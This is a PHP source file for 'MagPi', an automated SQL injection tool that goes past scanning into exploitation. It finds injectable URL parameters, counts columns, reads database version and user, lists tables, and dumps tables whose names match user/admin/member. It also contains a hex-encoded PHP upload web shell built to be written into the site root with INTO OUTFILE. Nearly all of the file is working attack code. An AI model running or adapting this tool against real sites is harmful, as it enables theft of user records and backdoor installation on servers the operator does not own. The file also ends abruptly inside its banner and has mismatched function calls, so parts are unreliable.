<?php

#########################################################################################
#                                                                                       #
# MagPi : Basic SQLi scanner.                                                           #
#                                                                                       #
# This script can be used to scan a web application for SQL Injection vulnerabilities.  #
#                                                                                       #
# Usage:                                                                                #
# ------                                                                                #
#                                                                                       #
# $> php magpi.php inputfile outputfile                                                 #
#                                                                                       #
# Where inputfile is the name of any text file that contains a list of URLs to scan,    # 
# one URL per line, and outputfile is the name of the log file to write results to.     #
# You can call these files whatever you like so long as the order is correct,           #
# input file, then output file. e.g.                                                    #
#                                                                                       #
# $> php magpi.php url-list.txt results.txt                                             #
#                                                                                       #
# Typically, you would generate the URL list from a spider script, which would          # 
# extrapolate a list of URLs from a web application, given an entry point,              #
# or you can compile the list manually.                                                 #
#                                                                                       #
# The log file will record the URL and URL parameter in which it finds a vulnerability, #
# and also any data that it manages to retrieve. This can help guage the seriousness of #
# pre-existing vulnerabilities in  live systems. The script will attempt to dig down to #
# the level of individual records in user tables.                                       #
#                                                                                       #
# Limitations:                                                                          #
# ------------                                                                          #
#                                                                                       #
# This script is intended for a quick evaluation of a web application, and therefore    #
# does support blind-sql injection techniques, boolean blind nor time-based blind,      #
# though this may be a future feature.                                                  #
# The script indended to scan applications built on a LAMP stack only, and probably     #
# won't work on applications built using PostgreSQL, MSSQL, Oracle or other.            #
#                                                                                       #
# Disclaimer:                                                                           #
# -----------                                                                           #
#                                                                                       #
# This software is intended for use in quickly testing, discovering, and guaging SQL    #
# injection vulnerabilities in web applications. It is freely available under the GNU   #
# AFFERO GPL license http://www.gnu.org/licenses/agpl.txt. Use this at your own risk!   #
# The creator of this software assumes no liability or responsibility for any damages,  #
# or criminal liability, incurred from the use of this software.                        #
#                                                                                       #
# Do not use this tool against targets that you do not own, or have prior consent to    #
# attack. To do so is illegal!                                                          #
#                                                                                       #
#########################################################################################

ini_set('display_errors', true);
ignore_user_abort(true);
set_time_limit(0);

if (PHP_SAPI === 'cli' && !isset($argv[1]) && !isset($argv[2])) {
    die("\nUsage: php magpi.php listFile logFile\n");
}

if (PHP_SAPI === 'cli') {
    startScan($argv[1], file($argv[1]), $argv[2]);
} else {
    echo "<html><head><title>MagPi</title></head><body><pre>";
    startScan($_GET['inputfile'], file($_GET['inputfile']), $_GET['logfile']);
}

/**
 * Runs the scan using the list of URLs in the input file.
 * The input file should be in te same folder as this script.
 * Results are recorded in specified log file.
 *
 * @access Public
 * @param String The name of the input file
 * @param Array the lines of the input file, each one being a URL to test
 * @param String The name of the log file to log scan results to
 * @return void
 */
function startScan($inputFile, $potentialList, $logFile)
{
    @mkdir('logs');

    // write time of scan to log file...
    $handle = fopen($logFile, 'a+');

    if (!$handle) {
        die("\nCouldn't open file $logFile");
    }
    
    fwrite($handle, "\nRunning Scan on input file: $inputFile at ".date('Y-m-d H:i:s')."\n\n");

    fclose($handle);

    print(getBanner());

    $lastScanned = reset(file('current.txt'));

    echo "\n\nRunning Scan on input file: $inputFile at ".date('Y-m-d H:i:s')."\n";

    $swapFile = fopen("current.txt", "a+");

    //if (!flock($swapFile, LOCK_EX | LOCK_NB)) {
        //die("\nCouldn't get lock on swap file, oter instance running?");
    //}

    // if true then scans will be skipped
    // we will iterate through each url in the list until we reached the one stored in the 'current.txt' file
    // which is the last url scanned, then we will turn off the ignore flag and start scanning again
    $ignoreFlag = true;

    $i = 0;

    $listCount = count($potentialList);

    // iterate through potential targets...
    foreach ($potentialList as $url) {
        if (!$lastScanned || $url == $lastScanned) {
            $ignoreFlag = false;
            //continue;
        } elseif ($ignoreFlag) {
            //continue;
        }
        scanUrl($url, $logFile, $swapFile, $lastScanned, $i, $listCount);
        $i++;
    }

    fclose($swapFile);

    echo "\n\nFinished Scan\n\n";

    if (PHP_SAPI !== 'cli') {
        echo "</pre></body></html>";
    }
}

/**
 * Tests a single URL for SQL injection and data retrieval
 *
 * @access Public
 * @param String The URL to test
 * @param String The name of the log file to record results to
 * @param Integer The position in the list of URLs to be scanned
 * @param Integer The length of the list of URLs
 * @return void
 */
function scanUrl($candidate, $logFile, $swapFile, $siteNumber, $listCount)
{
    $website = new stdClass;

    echo "\n\n".str_repeat('*', 60);

    echo "\n\nScanning $siteNumber of $listCount :: $candidate";

    ftruncate($swapFile, 0);

    fwrite($swapFile, $candidate);

    updateLogs($logFile, $candidate, 'a+');

    // attempnt to get injection point
    $injectionPoint = detectInjectionPoint($candidate);

    if (!$injectionPoint) {
        return;
    }

    echo "\n\nInjection Point: $injectionPoint";

    $website->injectionPoint = $injectionPoint;

    // now check for path disclosure on injection point parameter
    $pathDisclosureUrl = convertInjectionPoint($injectionPoint);

    // attempt to get the document root of the website
    $webRoot = getWebRoot($pathDisclosureUrl);

    $website->documentRoot = $webRoot;

    if ($webRoot) {
        echo "\n\nDocument Root: ".$website->documentRoot."\n\n";
    }

    // get number of columns returned in query
    $numberColumns = (binary_search($injectionPoint, range(1, 51), 1, 51, 'cmp') * -1) - 1;

    if (!$numberColumns) {
        return;
    }

    echo "\n\nNumber Columns: $numberColumns";

    $website->numberColumns = $numberColumns;

    // find out which columns are reflected
    $reflectedColumns = getReflectedColumns($injectionPoint, $numberColumns);

    if (!$reflectedColumns) {
        return;
    }

    echo "\n\nReflected Columns: \n\n";
    print_r($reflectedColumns);

    $website->reflectedColumns = implode(',', $reflectedColumns);

    // get mysql version, database name, and current mysql user
    $dbVersion = end(
        retrieveData(
            $injectionPoint,
            'version(),0x7c,database(),0x7c,user()',
            $numberColumns,
            $reflectedColumns
        )
    );

    @list($dbVersion, $dbName, $dbUser) = explode('|', $dbVersion);

    echo "\n\nDatabase Version: $dbVersion";
    echo "\n\nDatabase Name: $dbName";
    echo "\n\nDatabase User: $dbUser";

    $website->dbVersion = $dbVersion;

    // TODO: do not continue if MySql version too low to have information_schema tables

    // get list of tables
    $website->tablesList = getTables($injectionPoint, $numberColumns, $reflectedColumns);

    echo "\n\nTables Retrieved:";

    print_r($website->tablesList);

    // do any table names contain 'user' keyword
    $website->userTables = preg_grep("/(user|admin|member)/i", $website->tablesList);

    // if so, get columns of these tables
    $website->userTablesColumns = getColumns(
        $injectionPoint,
        $numberColumns,
        $reflectedColumns,
        $dbName,
        $website->userTables
    );

    // then get get dump
    $website->tabulatedData  = getDumpTabulated(
        $injectionPoint,
        $dbName,
        $numberColumns,
        $reflectedColumns,
        $website->userTables,
        $website->userTablesColumns
    );

    foreach ($website->tabulatedData as $tableName => $table) {
        echo "\n\n$tableName\n\n";
        echo "$table";
    }

    // TODO: attempt to deploy a web shell

    // write contents of website object to buffer
    ob_start();
    print_r($website);
    $logData = ob_get_contents();
    ob_end_clean();

    $urlData = parse_url($candidate);

    $logData = str_replace('stdClass Object', $urlData['host'], $logData);
    $logData = str_replace('Array', '', $logData);

    // dump buffer contents to log file
    updateLogs($logFile, $logData, 'a+');

    // record separate logfile for this site
    updateLogs("logs/{$urlData['host']}.txt", $logData, 'w');
}

/**
 * Writes data to log file
 *
 * @access Public
 * @param String The filename of the log file to write to
 * @param String The data to write to the log file
 * @param String The mode to open the log file
 * @return Boolean
 */
function updateLogs($logFile, $data, $mode)
{
    $handle = fopen($logFile, $mode);
    if (!$handle) {
        echo "\n\nCouldn't open log file $logFile!!";
        return false;
    }
    fwrite($handle, $data."\n");
    fclose($handle);

    return true;
}

/**
 * Gets a list of all the tables in the active schema
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param Integer The number of columns in the query that is being injected into
 * @param Array The list of columns whose values populate parts of the webpage
 * @return Array An ordered list of table names
 */
function getTables($injectionPoint, $numberColumns, $reflectedColumns)
{
    $qualifier = ' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = database() GROUP BY table_schema';

    // first get the table count do we know how many results to expect
    $tablesCount = retrieveData($injectionPoint, 'COUNT(table_name)', $numberColumns, $reflectedColumns, $qualifier);

    $tablesCount = (is_array($tablesCount)) ? end($tablesCount) : $tablesCount;

    echo "\n\nTables Count: $tablesCount";

    $tablesList = retrieveData(
        $injectionPoint,
        'GROUP_CONCAT(table_name SEPARATOR 0x7c)',
        $numberColumns,
        $reflectedColumns,
        $qualifier
    );

    $tablesList = (is_array($tablesList)) ? end($tablesList) : $tablesList;

    $tables = explode('|', $tablesList);

    // group_concat has a limit of 1024 characters by default, which may not give us all our tables
    // if we have not retrieved all the tables we know are there then repeat in descending order
    if (count($tables) < $tablesCount) {
        echo "\n\nMore Tables Retrieved:\n\n";

        $tablesList = retrieveData(
            $injectionPoint,
            'GROUP_CONCAT(table_name ORDER BY 1 DESC SEPARATOR 0x7c)',
            $numberColumns,
            $reflectedColumns,
            $qualifier
        );

        $tablesList = (is_array($tablesList)) ? end($tablesList) : $tablesList;
        $moreTables = explode('|', $tablesList);
        $lastTable = array_pop($tables);
        $firststTable = array_pop($moreTables);
        $mergedTables = array_merge($tables, array_reverse($moreTables));
        $tables = array_values(array_unique($mergedTables));
    }

    // if we haven't retrieved the full table list with the above three requests,
    // then we will need to retieve each table in the list, one by one...
    if (count($tables) < $tablesCount) {
        $tables = array();
        $i = 2;
        $tableName = array(reset($tables));
        while (is_array($tablesList) && !empty($tableName) && $i < 100) {
            $qualifier = ' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = database()'
                        .' AND table_name NOT IN ('.implode($tablesList).') LIMIT '.$i.', 1';

            $tableName = retrieveData($injectionPoint, 'table_name', $numberColumns, $reflectedColumns, $qualifier);
            if (!empty($tableName)) {
                $tables[] = reset($tableName);
            }
            $i++;
        }
    }

    return $tables;
}

/**
 * Gets a list of all the tables in the active schema
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param Integer The number of columns in the query that is being injected into
 * @param Array The list of columns whose values populate parts of the webpage
 * @param String The name of the DB Schema to target
 * @param Array The list of tables containing the string pattern 'user'
 * @return Array An ordered list of table names
 */
function getColumns($injectionPoint, $numberColumns, $reflectedColumns, $dbName, $userTables)
{
    $columnsList = array();

    if (!empty($userTables)) {
        foreach ($userTables as $tableName) {
            echo "\n\nGetting columns for table: $tableName\n";

            // next line: qualifier not being reset (i.e. Limit 9,1)
            // also - may need to cast as char
            // e.g. SELECT CAST(CONCAT(0x444253545254,COUNT(column_name),0x4442454e44) AS CHAR(255)),2,3

            $qualifier = ' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 0x'
                        .strToHex($dbName)." AND table_name = 0x".strToHex($tableName);

            //echo "\n$qualifier\n";

            $columnsCount = retrieveData(
                $injectionPoint,
                'COUNT(column_name)',
                $numberColumns,
                $reflectedColumns,
                $qualifier
            );

            $columnsCount = (is_array($columnsCount)) ? end($columnsCount) : $columnsCount;

            echo "\nNumber of Columns: $columnsCount\n\n";

            $columnList = retrieveData(
                $injectionPoint,
                'column_name',
                $numberColumns,
                $reflectedColumns,
                $qualifier
            );

            $columns = array_unique($columnList);

            print_r($columns);

            if (count($columns) < $columnsCount) {
                $columns = array();
                $i = 0;
                $columnName = array(reset($columns));
                
                while ($i <= $columnsCount) {
                    $qualifier = ' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 0x'.strToHex($dbName)
                                ." AND table_name = 0x".strToHex($tableName)." LIMIT $i, 1";
                    
                    $columnName = retrieveData(
                        $injectionPoint,
                        'column_name',
                        $numberColumns,
                        $reflectedColumns,
                        $qualifier
                    );

                    if (!empty($columnName)) {
                        $columns[] = reset($columnName);
                    }
                    $i++;
                }
                print_r($columns);
            }

            $columnsList[$tableName] = $columns;
        }
    }

    return $columnsList;
}

/**
 * Dumps data from user tables
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param String The name of the DB Schema to target
 * @param Integer The number of columns in the query that is being injected into
 * @param Array The list of columns whose values populate parts of the webpage
 * @param Array The list of tables containing the string pattern 'user'
 * @param Array A two-dimensional array of tables and columns
 * @return Array The tabulated data dump of each user table
 */
function getDumpTabulated($injectionPoint, $dbName, $numberColumns, $reflectedColumns, $userTables, $columnsList)
{
    $tabulatedData = array();

    if (!empty($userTables)) {
        foreach ($userTables as $tableName) {
            echo "\n\nDumping table $tableName:";

            // first get count
            $rowCount = getDump(
                $injectionPoint,
                $dbName,
                $numberColumns,
                $reflectedColumns,
                $tableName,
                $columnsList[$tableName],
                true
            );

            $rowCount = (is_array($rowCount)) ? end($rowCount) : $rowCount;

            $rowCount = str_replace(',', '', $rowCount);

            echo "\n\nNumber of records: $rowCount";

            $info = getDump(
                $injectionPoint,
                $dbName,
                $numberColumns,
                $reflectedColumns,
                $tableName,
                $columnsList[$tableName]
            );

            $data = array_unique($info);

            // for testing
            //$rowCount = 10;

            echo "\n\nRow Count: ".count($data)." - ".$rowCount."\n\n";

            if (count($data) < $rowCount) {
                $buffer = array();
                for ($i=1; $i<=$rowCount; $i++) {
                    $record = getDump(
                        $injectionPoint,
                        $dbName,
                        $numberColumns,
                        $reflectedColumns,
                        $tableName,
                        $columnsList[$tableName],
                        false,
                        $i
                    );

                    $recordDump = (is_array($record)) ? reset($record) : $record;
                    if ($recordDump) {
                        $buffer[] = $recordDump;
                    }
                }
                $data = $buffer;
            }

            if (!empty($data)) {
                $tabulatedData[$tableName] = tabulateData($columnsList[$tableName], $data);
            }
        }
    }

    return $tabulatedData;
}

/**
 * Initiates a HTTP request to a given URL, and return the response body
 *
 * @access Public
 * @param String The URL to send the HTTP request to
 * @return String The body of the HTTP response
 * @todo Create alternative ways to make request when php-curl is not available
 */
function runQuery($url)
{
    // in case curl is not installed, check out these techniques:
    // http://stackoverflow.com/questions/3849415/twitter-oauth-via-php-without-curl

    //echo "\n\n$url\n";

    $userAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3";

    // set up curl options...
    $options = array(
        CURLOPT_VERBOSE        => false,     // return web page
        CURLOPT_STDERR         => fopen('php://output', 'w+'),
        CURLOPT_RETURNTRANSFER => true,     // return web page
        CURLOPT_HEADER         => true,    // don't return headers
        CURLOPT_FOLLOWLOCATION => false,     // follow redirects
        CURLOPT_ENCODING       => "",       // handle all encodings
        CURLOPT_AUTOREFERER    => true,     // set referer on redirect
        CURLOPT_CONNECTTIMEOUT => 30,       // timeout on connect
        CURLOPT_TIMEOUT        => 20,       // timeout on response
        CURLOPT_MAXREDIRS      => 3,       // stop after 10 redirects
        CURLOPT_PROXY           => '',
        //CURLOPT_COOKIEFILE   => "cookie.txt",
        //CURLOPT_COOKIEJAR    => "cookie.txt",
        CURLOPT_USERAGENT      => $userAgent,
        CURLOPT_REFERER        => "https://www.google.com/",
    );

    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $pageContents = curl_exec($ch);
    curl_close($ch);

    return $pageContents;
}

/**
 * Get a complete dump of a given table within the database
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param String The name of the DB Schema to target
 * @param Integer The number of columns in the query that is being injected into
 * @param Array The list of columns whose values populate parts of the webpage
 * @param String The name of the DB table to target
 * @param Array The list of each of the column names in the target table
 * @return Array Each row of the table, in CSV format
 */
function getDump($url, $dbName, $numberColumns, $reflectedColumns, $tableName, $columnsList, $getRowCount = false, $limit = 0)
{
    $query = '';
    $paramInserted = false;

    for ($i=1; $i<=$numberColumns; $i++) {
        if (in_array($i, $reflectedColumns) && !$paramInserted) {
            if ($getRowCount) {
                $query .= "CONCAT_WS(0x2c,0x444253545254,COUNT(1),0x4442454e44),";
            } else {
                $query .= "CONCAT_WS(0x2c,0x444253545254,";
                foreach ($columnsList as $column) {
                    $query .= $column.',';
                }
                $query .= "0x4442454e44),";
            }
            $paramInserted = true;
        } else {
            $query .= $i.',';
        }
    }

    $injectionPair = split("'", $url);

    $query = rtrim($query, ',')." FROM $dbName.$tableName";

    $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

    $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'AND FALSE UNION SELECT';

    if ($limit) {
        $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'AND FALSE UNION SELECT';
        $query .= " LIMIT $limit, 1";
    }

    $testUrl = sprintf('%s%s %s -- %s', reset($injectionPair), $injectionStart, $query, end($injectionPair));

    //echo "\n\n$testUrl\n\n";

    $encodedUrl = preg_replace('/\s/', '%20', $testUrl);
    
    $pageContents = runQuery($encodedUrl);

    $columnsList = preg_match_all("/DBSTRT(.*?)DBEND/", $pageContents, $data);
    
    return $data[1];
}

/**
 * Format the table in a human readable, tabulated grid
 *
 * @access Public
 * @param Array The list of each of the column names in the target table
 * @param Array Each row of the table, in CSV format
 * @return String The data formatted in a human readable grid
 */
function tabulateData($headers, $data)
{
    if (empty($data)) {
        return false;
    }

    $numberColumns = count($headers);

    $columnSizes = $tableData = array();

    $headerRow = array(implode(',', $headers));

    $data = array_merge($headerRow, $data);

    // iterate through each row of each column, and get the longest string length of each column
    foreach ($data as $row) {
        $rowData = explode(',', trim($row, ','));
        $tableData[] = $rowData;
        $rowLength = count($rowData);

        for ($i=0; $i<$rowLength; $i++) {
            $columnSizes[$i] = (isset($columnSizes[$i]) && $columnSizes[$i] > strlen($rowData[$i]))
                            ? $columnSizes[$i]
                            : strlen($rowData[$i]);
        }
    }

    $output = '';
    $borderDone = false;
    $border = '+-';

    // use this for padding each printed value
    foreach ($tableData as $row) {
        $output .= '| ';

        for ($i=0; $i<$numberColumns; $i++) {
            $output .= ' '.str_pad($row[$i], $columnSizes[$i], ' ').' |';
            if (!$borderDone) {
                $border .= str_repeat('-', $columnSizes[$i]+2).'+';
            }
        }

        $borderDone = true;
        $output .= "\n";
    }

    $output = substr_replace($output, "\n".$border, strlen($border), 0);

    $returnString = "\n$border\n$output$border\n\n";

    return $returnString;
}

/**
 * Builds a injected query into our target URL
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param String The actual data we want to select
 * @param Integer The number of columns returned from the query we're inject into
 * @param Array Which columns have their values printed on the page
 * @param Array The qualifying section of the injected query, table to target, conditions etc.
 * @return String The encoded URL containing our injected query
 */
function buildQuery($url, $param, $numberColumns, $reflectedColumns, $queryQualifier = '')
{
    $query = '';
    $paramInserted = false;

    for ($i=1; $i<=$numberColumns; $i++) {
        if (in_array($i, $reflectedColumns) && !$paramInserted) {
            $query .= "CONCAT(0x444253545254,$param,0x4442454e44),";
            $paramInserted = true;
        } else {
            $query .= $i.',';
        }
    }

    $injectionPair = split("'", $url);

    $query = rtrim($query, ',').$queryQualifier;

    $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

    $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'AND 1 = 0 UNION SELECT';

    $testUrl = sprintf('%s%s %s -- %s', reset($injectionPair), $injectionStart, $query, end($injectionPair));

    $encodedUrl = preg_replace('/\s/', '%20', $testUrl);

    return $encodedUrl;
}

/**
 * Returns a comma delineated list of column in the specified table
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param String The name of the active schema
 * @param Integer The number of columns returned from the query we're inject into
 * @param Array Which columns have their values printed on the page
 * @param String the name of the table who column names we want
 * @return String the comaa delineated list of column names for the given table
 */
function retrieveData($url, $param, $numberColumns, $reflectedColumns, $qualifier = '')
{
    $url = buildQuery($url, $param, $numberColumns, $reflectedColumns, $qualifier);
    
    $pageContents = runQuery($url);

    $queryResult = preg_match_all("/DBSTRT(.*?)DBEND/", $pageContents, $data);
    
    return $data[1];
}

/**
 * Determines which columns values reflected in the markup of the page
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param Integer The number of columns returned from the query we're inject into
 * @return Array the list of column numbers that are present on the page
 */
function getReflectedColumns($url, $numberColumns)
{
    $nonces = getNonces($numberColumns);

    $injectionPair = split("'", $url);

    $encodedNonces = '';

    foreach ($nonces as $nonce) {
        $encodedNonces .= '0x'.strToHex($nonce).',';
    }

    $encodedNonces = rtrim($encodedNonces, ',');

    $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

    $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').' AND 1 = 0 UNION SELECT';

    $testUrl = sprintf('%s%s %s -- %s', reset($injectionPair), $injectionStart, $encodedNonces, end($injectionPair));

    $encodedUrl = preg_replace('/\s/', '%20', $testUrl);

    $pageContents = runQuery($encodedUrl);

    $reflectedColumnsList = array();

    for ($i=1; $i<count($nonces); $i++) {
        if (strpos($pageContents, $nonces[$i-1]) !== false) {
            $reflectedColumnsList[] = $i;
        }
    }

    return $reflectedColumnsList;
}

/**
 * Returns a list of random strings which used to 'book-end' results so they can be scraped from the markup
 *
 * @access Public
 * @param Integer the number of columns in the query we are injecting into
 * @return Array The list of reflected columns
 */
function getNonces($numberColumns)
{
    $nonces = array();

    for ($i=0; $i<$numberColumns; $i++) {
        $nonces[] = randomString(6);
    }

    return $nonces;
}

/**
 * Ascertains the document root of the website or absolute path to the script
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @return String The path to the document root of the website
 */
function getWebRoot($url)
{
    //echo "\n\nChecking for path disclosure...";
    $pageContents = runQuery($url);
    
    $styledWarning = "/<b>Warning<\/b>:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in <b>(.+?)<\/b> on line <b>\d+<\/b>/";
    $plainWarning = "/Warning:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in (.+?) on line \d+/";

    preg_match($styledWarning, $pageContents, $styledMatch);
    preg_match($plainWarning, $pageContents, $plainMatch);

    $paths = array_merge($styledMatch, $plainMatch);
    
    if (!empty($paths)) {
        $systemPath = substr($paths[1], 0, strrpos($paths[1], '/')).'/';

        return $systemPath;
    }

    return false;
}

/**
 * Detects if a given URL is susceptible to injection, and where the injection point is
 *
 * @access Public
 * @param String The URL we are interested in testing
 * @return String The URL with an apostrophe marking the injectable parameter
 */
function detectInjectionPoint($candidate)
{
    $testUrls = makeOptions($candidate);

    if ($testUrls) {
        foreach ($testUrls as $option) {
            $option = rtrim($option, '_');
            if (checkError($option)) {
                return $option;
            }
        }
    }

    return false;
}

/**
 * Extraploates a list of URL tests for testing each parameter in a given URL
 *
 * @access Public
 * @param String The URL we want to test
 * @param Boolean If set to true, wil create test URLs for disclosing system path
 * @return Array the list of test URLs
 */
function makeOptions($url, $pathDisclose = false)
{
    $parts = parse_url(rtrim($url));

    if (isset($parts['query'])) {
        $queryString = $parts['query'];
    } else {
        return false;
    }

    parse_str($queryString, $pairs);

    $options = array();

    foreach ($pairs as $key => $value) {
        $buffer = "{$parts['scheme']}://{$parts['host']}{$parts['path']}?";
        foreach ($pairs as $subKey => $subValue) {
            $buffer .= ($key == $subKey) ? "$subKey=$subValue'&" : "$subKey=$subValue&";
        }
        $options[] = rtrim($buffer, '&');
    }

    return $options;
}

/**
 * Converts a URL with an apostrophe that indicates an injection, 
 * to a URL with square brackets, which may reveal system path
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @return String The converted URL
 */
function convertInjectionPoint($url)
{
    $injectionPair = split("'", $url);

    $pathDisclosureUrl = substr($injectionPair[0], 0, strrpos($injectionPair[0], "=")).'[]'
                        .substr($injectionPair[0], strrpos($injectionPair[0], "=")).$injectionPair[1];

    return $pathDisclosureUrl;
}

/**
 * Generates a payoad for attempting to drop a web shell on the site
 *
 * @access Public
 * @param String The absolute system ath to the document root of the website
 * @param String The URL containg the injection point marked with an apostrophe
 * @return String The generated payload
 */
function createPayload($path, $url)
{
    $hexDump = '3c666f726d20656e63747970653d226d756c7469706172742f666f726d2d646174612220616374696f6e3d2275702e70687022206d6574686f643d22504f5354223e3c696e707574206e616d653d2275702220747970653d2266696c65222f3e3c696e70757420747970653d227375626d6974222076616c75653d22476f222f3e3c2f666f726d3e3c3f70687020247461726765745f706174683d40626173656e616d6528245f46494c45535b227570225d5b226e616d65225d293b6563686f20406d6f76655f75706c6f616465645f66696c6528245f46494c45535b227570225d5b22746d705f6e616d65225d2c247461726765745f70617468293f247461726765745f706174682e22207570223a226e6f747570223b3f3e';

    $target = strToHex($path.'/go.php'); // encoding path will not work

    $sql = "SELECT 0x$hexDump INTO OUTFILE 0x$target";

    return $sql;
}

/**
 * Converts a string to its hexadecimal representation
 *
 * @access Public
 * @param String The string to be converted
 * @return String The hexadecimal encoded string
 */
function strToHex($string)
{
    $hex='';
    for ($i=0; $i < strlen($string); $i++) {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}

/**
 * Performs a binary search of within a given range to find the number of columns in the injectable query
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param Array The list of values to search through
 * @param Integer The lowest delimiter in the range
 * @param Integer The highest delimiter in the range
 * @param Function the function to invoke when testing each value
 * @return Integer The next value to test
 */
function binary_search($injectionPoint, array $testRange, $first, $last, $compare)
{
    $lo = $first;
    $hi = $last - 1;

    while ($lo <= $hi) {
        $mid = (int)(($hi - $lo) / 2) + $lo;
        $cmp = call_user_func($compare, $injectionPoint, $mid);

        if ($cmp) {
            // there was an error - we've gone too high - must go lower
            // high becomes mid, low stays the same
            $hi = $mid - 1;
        } else {
            // there was NO error - we've gone too low - must go higher
            // low becomes mid, high stays the same
            $lo = $mid +1;
        }
    }
    return -($lo);
}

/**
 * Injects an 'order by' qualifier to determine the number of columns the executing query
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param Integer The column number to try to sort by
 * @return String The URL to use for testing the number of columns available
 */
function getColumnCount($url, $column)
{
    $injectionPair = split("'", $url);

    $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

    $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'ORDER BY';

    $columnCountUrl = sprintf('%s%s %d -- %s', reset($injectionPair), $injectionStart, $column, end($injectionPair));

    $encodedUrl = preg_replace('/\s/', '%20', $columnCountUrl);

    return $encodedUrl;
}

/**
 * Runs a query against the target site to deteremine if the given column number
 * throws an error when used with 'order by'
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @param Integer The column number to try to sort by
 * @return Boolean Returns true if an error is on the page, indicating we have exceed the number of columns available
 */
function cmp($injectionPoint, $columnNumber)
{

    $testUrl = getColumnCount($injectionPoint, $columnNumber);

    return checkError($testUrl);
}

/**
 * Given a URL, will determine if the URL will trigger an error on the page
 * used for detecting injection point, web root etc.
 *
 * @access Public
 * @param String The URL to hit, the injection point is indicated with an apostrophe
 * @return Boolean True if a specific type of error was detected on the page
 */
function checkError($url)
{
    $pageContents = runQuery($url);
    
    $errorMessage = 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use';
    $styledWarning = "/<b>Warning<\/b>:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in <b>(.+?)<\/b> on line <b>\d+<\/b>/";
    $plainWarning = "/Warning:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in (.+?) on line \d+/";
    $wrongNumberColumns = 'The used SELECT statements have a different number of columns';
    $unknownColumn = 'Unknown column';

    preg_match($styledWarning, $pageContents, $styledMatch);
    preg_match($plainWarning, $pageContents, $plainMatch);

    $merged = array_merge($styledMatch, $plainMatch);

    //echo "\n\nPAGE CONTENTS:\n\n$pageContents\n\n";

    if (strpos($pageContents, $errorMessage) !== false
        || strpos($pageContents, $unknownColumn) !== false
        || strpos($pageContents, $wrongNumberColumns) !== false
        || !empty($merged)) {
        return true;
    }
    return false;
    
    return (strpos($pageContents, $errorMessage) !== false || !empty($merged));
}

/**
 * Generates a random string
 *
 * @access Public
 * @param Integer The length of the random string to generate
 * @return String A random sequence of alphanumeric characters
 */
function randomString($strLen = 32)
{
    // Create our character arrays
    $chrs = array_merge(range('a', 'z'), range('A', 'Z'), range(0, 9));

    // Just to make the output even more random
    shuffle($chrs);

    // Create a holder for our string
    $randStr = '';

    // Now loop through the desired number of characters for our string
    for ($i=0; $i<$strLen; $i++) {
        $randStr .= $chrs[mt_rand(0, (count($chrs) - 1))];
    }

    return $randStr;
}

/**
 * Returns our script banner, which is dislayed when the script runs.
 * @access public
 * @return String Our ascii-art banner
 */
function getBanner()
{
    $banner = <<<EOT
ICAgICAgX19fICAgICAgICAgICBfX18gICAgICAgICAgIF9fXyAgICAgICAgICAgX19fICAgICAg
ICAgICAgICAgICANCiAgICAgL1xfX1wgICAgICAgICAvXCAgXCAgICAgICAgIC9cICBcICAgICAg
ICAgL1wgIFwgICAgICAgICAgX19fICAgDQogICAgLzo6fCAgfCAgICAgICAvOjpcICBcICAgICAg
IC86OlwgIFwgICAgICAgLzo6XCAgXCAgICAgICAgL1wgIFwgIA0KICAgLzp8OnwgIHwgICAgICAv
Oi9cOlwgIFwgICAgIC86L1w6XCAgXCAgICAgLzovXDpcICBcICAgICAgIFw6XCAgXCANCiAgLzov
fDp8X198X18gICAvOjpcflw6XCAgXCAgIC86LyAgXDpcICBcICAgLzo6XH5cOlwgIFwgICAgICAv
OjpcX19cDQogLzovIHw6Ojo6XF9fXCAvOi9cOlwgXDpcX19cIC86L19fL19cOlxfX1wgLzovXDpc
IFw6XF9fXCAgX18vOi9cL19fLw0KIFwvX18vfn4vOi8gIC8gXC9fX1w6XC86LyAgLyBcOlwgIC9c
IFwvX18vIFwvX19cOlwvOi8gIC8gL1wvOi8gIC8gICANCiAgICAgICAvOi8gIC8gICAgICAgXDo6
LyAgLyAgIFw6XCBcOlxfX1wgICAgICAgIFw6Oi8gIC8gIFw6Oi9fXy8gICAgDQogICAgICAvOi8g
IC8gICAgICAgIC86LyAgLyAgICAgXDpcLzovICAvICAgICAgICAgXC9fXy8gICAgXDpcX19cICAg
